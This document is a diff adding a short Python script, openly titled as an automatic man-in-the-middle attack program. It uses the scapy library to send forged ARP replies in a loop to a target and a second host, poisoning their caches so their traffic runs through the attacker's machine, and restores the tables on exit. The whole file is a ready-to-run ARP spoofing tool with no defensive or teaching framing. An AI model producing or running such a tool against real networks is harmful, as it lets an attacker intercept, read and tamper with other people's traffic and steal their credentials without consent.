@@ -1,0 +1,51 @@
+# Automatic Man-in-the-Middle Attack Program
+
+import scapy.all as scapy
+import socket
+import os
+import sys
+
+def get_mac(ip):
+    try:
+        return scapy.getmacbyip(ip)
+    except Exception as e:
+        print(f"Error getting MAC address: {e}")
+        return None
+
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    if target_mac is None:
+        print("Target MAC address not found.")
+        return
+
+    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(arp_response, verbose=False)
+
+def restore(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    spoof_mac = get_mac(spoof_ip)
+    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+    scapy.send(arp_response, count=4, verbose=False)
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python mitm.py <target_ip> <spoof_ip>")
+        sys.exit(1)
+
+    target_ip = sys.argv[1]
+    spoof_ip = sys.argv[2]
+
+    try:
+        print("Starting ARP Spoofing...")
+        while True:
+            arp_spoof(target_ip, spoof_ip)
+            arp_spoof(spoof_ip, target_ip)
+            scapy.time.sleep(2)
+    except KeyboardInterrupt:
+        print("Restoring ARP tables...")
+        restore(target_ip, spoof_ip)
+        restore(spoof_ip, target_ip)
+        print("ARP tables restored.")
+
+if __name__ == "__main__":
+    main()
